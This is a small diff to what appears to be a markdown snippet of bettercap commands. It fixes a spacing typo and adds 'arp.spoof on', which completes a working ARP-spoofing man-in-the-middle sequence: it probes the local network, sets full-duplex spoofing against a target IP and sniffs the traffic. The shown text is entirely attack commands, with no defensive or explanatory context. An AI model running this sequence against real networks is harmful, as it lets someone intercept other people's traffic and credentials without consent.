@@ -4,13 +4,13 @@
 bettercap -iface eth0
 
 help
-help  net.probe
+help net.probe
 
 net.probe on
 net.show
 
 set arp.spoof.fullduplex true
 set arp.spoof.targets [target ip]
-
+arp.spoof on
 net.sniff on
 ```
